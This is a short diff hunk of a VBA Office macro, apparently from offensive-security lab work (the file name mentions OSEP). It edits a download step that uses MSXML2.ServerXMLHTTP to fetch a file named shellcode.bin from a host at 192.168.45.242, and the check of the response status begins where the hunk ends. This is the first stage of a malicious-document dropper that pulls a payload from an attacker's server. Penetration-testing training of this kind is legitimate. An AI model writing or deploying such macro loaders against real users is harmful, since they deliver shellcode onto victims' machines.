@@ -33,7 +33,7 @@ Sub MyMacro()
     
     ' 1. DOWNLOAD
     Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    http.Open "GET", "http://192.168.45.242/shellcodeOSEP.bin", False
+    http.Open "GET", "http://192.168.45.242/shellcode.bin", False
     http.Send
 
     If http.Status = 200 Then
